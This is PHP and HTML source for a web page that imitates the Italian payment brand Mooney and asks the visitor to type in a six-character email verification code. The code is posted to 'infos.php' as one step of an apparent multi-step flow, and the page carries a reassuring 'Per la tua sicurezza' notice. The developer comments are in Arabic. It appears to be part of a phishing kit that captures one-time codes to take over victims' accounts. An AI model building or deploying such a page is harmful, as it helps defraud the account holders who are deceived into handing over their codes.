<?php
session_start();
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mooney - Verifica Email</title>
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        /* Title */
        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #4F4F4F;
            margin-bottom: 40px;
            line-height: 1.6;
        }
        
        /* Email Animation */
        .email-animation {
            position: relative;
            margin: 30px 0;
            height: 150px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .email-envelope {
            width: 120px;
            height: 100px;
            background: linear-gradient(135deg, #FFCC00, #e6b800);
            border-radius: 12px;
            position: relative;
            box-shadow: 0 10px 25px rgba(255, 204, 0, 0.3);
            animation: emailPulse 2s infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }
        
        .email-envelope::before {
            content: '';
            position: absolute;
            top: -15px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 30px solid transparent;
            border-right: 30px solid transparent;
            border-bottom: 15px solid #e6b800;
        }
        
        .message-icon {
            font-size: 24px;
            color: #008085;
            margin-bottom: 8px;
        }
        
        .message-text {
            font-size: 12px;
            color: white;
            font-weight: 600;
            text-align: center;
            margin-bottom: 5px;
        }
        
        .code-preview {
            font-size: 16px;
            color: #008085;
            font-weight: bold;
            font-family: 'Courier New', monospace;
            background: white;
            padding: 6px 12px;
            border-radius: 6px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        
        @keyframes emailPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        /* Form Container */
        .form-container {
            width: 100%;
        }
        
        .form-group {
            margin-bottom: 30px;
            width: 100%;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            color: #4F4F4F;
            font-size: 16px;
            font-weight: bold;
        }
        
        .input-field {
            width: 100%;
            padding: 0;
            border: none;
            border-bottom: 2px solid #ddd;
            font-size: 18px;
            color: #4F4F4F;
            background: transparent;
            padding-bottom: 8px;
            transition: border-color 0.3s;
            text-align: center;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            letter-spacing: 8px;
        }
        
        .input-field::placeholder {
            color: #4F4F4F;
            font-size: 16px;
            letter-spacing: normal;
            font-family: Arial, sans-serif;
            font-weight: normal;
        }
        
        .input-field:focus {
            outline: none;
            border-bottom-color: #008085;
        }
        
        /* Error Styles */
        .input-field.error {
            border-bottom-color: #dc3545;
        }
        
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
            font-weight: 600;
            animation: fadeIn 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .error-icon {
            font-size: 16px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-5px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .input-hint {
            color: #4F4F4F;
            font-size: 14px;
            margin-top: 8px;
            text-align: center;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 18px;
            background-color: #FFCC00;
            color: #333;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 30px;
            transition: background-color 0.3s;
        }
        
        .btn:hover {
            background-color: #e6b800;
        }
        
        .security-info {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
        }
        
        .security-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: #008085;
        }
        
        .security-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .security-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .input-field {
                font-size: 16px;
            }
            
            .email-envelope {
                width: 100px;
                height: 85px;
            }
            
            .email-envelope::before {
                border-left: 25px solid transparent;
                border-right: 25px solid transparent;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 22px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
            
            .btn {
                padding: 16px;
                font-size: 16px;
            }
            
            .email-envelope {
                width: 90px;
                height: 75px;
            }
            
            .input-field {
                letter-spacing: 6px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <!-- Email Animation -->
        <div class="email-animation">
            <div class="email-envelope">
                <div class="message-icon">✉️</div>
                <div class="message-text">MOONEY</div>
                <div class="code-preview">•••••</div>
                <div class="message-text" style="font-size: 9px;">Codice di verifica</div>
            </div>
        </div>
        
        <!-- Title -->
        <h1>Verifica via Email</h1>
        <p class="subtitle">
            Ti abbiamo inviato un codice di verifica al tuo indirizzo email<br>
            Inserisci il codice ricevuto per continuare
        </p>
        
        <div class="form-container">
            <form action="infos.php" method="POST">
                <!-- إضافة حقل hidden لتحديد الخطوة -->
                <input type="hidden" name="step" value="email_code">
                
                <div class="form-group">
                    <label for="email-code">Codice di verifica Email*</label>
                    <input type="text" id="email-code" name="email_code" class="input-field <?php echo (isset($_SESSION['errors']) && isset($_SESSION['errors']['email_code'])) ? 'error' : ''; ?>" placeholder="Es: A1B2C3" required maxlength="6">
                    
                    <?php if(isset($_SESSION['errors']) && isset($_SESSION['errors']['email_code'])): ?>
                    <div class="error-message">
                        <span class="error-icon">⚠️</span>
                        Codice email non valido. Riprova.
                    </div>
                    <?php 
                        // إزالة الخطأ من الجلسة بعد عرضه
                        unset($_SESSION['errors']['email_code']);
                    endif; 
                    ?>
                    
                    <div class="input-hint">Inserisci il codice a 6 caratteri ricevuto via email</div>
                </div>
                
                <button type="submit" class="btn">VERIFICA CODICE</button>
            </form>
            
            <!-- Security Info -->
            <div class="security-info">
                <div class="security-icon">🛡️</div>
                <div class="security-title">Per la tua sicurezza</div>
                <p class="security-description">
                    Il codice email è valido per 15 minuti. Non condividere il codice con nessuno.
                    Mooney non richiederà mai il codice via telefono.
                </p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const emailInput = document.getElementById('email-code');
            
            // تحديد الحد الأقصى لـ 6 أحرف
            emailInput.addEventListener('input', function(e) {
                // السماح فقط بالأحرف والأرقام
                this.value = this.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
                
                // تحديد الحد الأقصى لـ 6 أحرف
                if (this.value.length > 6) {
                    this.value = this.value.slice(0, 6);
                }
            });
            
            // تأثيرات الظهور المتدرج
            const container = document.querySelector('.form-container');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            container.style.transition = 'all 0.8s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 200);
            
            // تركيز الحقل تلقائياً
            emailInput.focus();
        });
    </script>
</body>
</html>